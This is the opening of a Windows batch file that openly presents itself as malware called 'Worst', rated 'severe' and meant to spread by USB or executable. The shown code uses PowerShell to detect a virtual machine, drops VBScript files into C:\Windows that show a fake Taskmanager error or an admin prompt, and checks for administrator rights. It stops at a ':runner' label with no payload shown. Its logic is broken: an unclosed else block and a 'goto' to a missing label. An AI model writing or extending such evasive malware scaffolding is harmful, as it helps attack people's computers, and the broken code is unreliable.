@echo off

::                   THIS
::                    IS 
::                   YOUR
::  █     █░ ▒█████   ██▀███    ██████ ▄▄▄█████▓
:: ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒▒██    ▒ ▓  ██▒ ▓▒
:: ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒░ ▓██▄   ▒ ▓██░ ▒░
:: ░█░ █ ░█ ▒██   ██░▒██▀▀█▄    ▒   ██▒░ ▓██▓ ░ 
:: ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██████▒▒  ▒██▒ ░ 
:: ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░  ▒ ░░   
::   ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒  ░ ░    ░    
::   ░   ░  ░ ░ ░ ▒    ░░   ░ ░  ░  ░    ░      
:: ░        ░ ░     ░           ░           
::                  Nightmare       
::
::
::
:: -------------|  Malware info  |-------------
:: |
:: | Harm Level - severe    or     8/10
:: | Creator - CPScript
:: | OS System - Windows
:: | Created - March, 6th 2023
:: | How to use - USB or executable
:: | File size - Unknown
:: | Encrypted - NO
:: | Encryption - NO
:: | Warnings - NO
:: | Where to get - https://Github.com/CPScript/Worst
:: | Harmfull - YES
:: | Payloads - Probibly
:: | Finished on - Unknown
:: 
:: 
:: 
:: 
:: !!!! Use at your own risk !!!!
::============================================================================================================================
::
:: =============
:: |   Start   |
:: =============


color 6D

title Worst

:: Are you using a VM?

FOR /F "tokens=* USEBACKQ" %%F IN (`PowerShell.exe -command " (gwmi Win32_BaseBoard).Manufacturer -eq 'Microsoft Corporation' "`) DO (
SET check=%%F
)
echo %check%

if %check% == False (
    echo Dim WshShell, BtnCode>C:\Windows\ifvm.vbs
    echo Set WshShell = WScript.CreateObject("WScript.Shell")>>C:\Windows\ifvm.vbs
    echo BtnCode = WshShell.Popup("Could not start process!",2+48,"Taskmanager")>>C:\Windows\ifvm.vbs
    echo Select Case BtnCode>>C:\Windows\ifvm.vbs
    echo case 3 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 4 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 5 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo End Select>>C:\Windows\ifvm.vbs
    start C:\Windows\ifvm.vbs
    pause
    exit
) else (
    goto Worst
    
:: Run me as admin LOSER

:admin

net session >nul 2>&1

if %errorLevel% == 0 (
    goto runner
) else (
    echo msgbox("Please run as admin",0+64,"Admin") > C:\Windows\Admin.vbs
    start C:\Windows\Admin.vbs
    pause
    exit
)

:runner

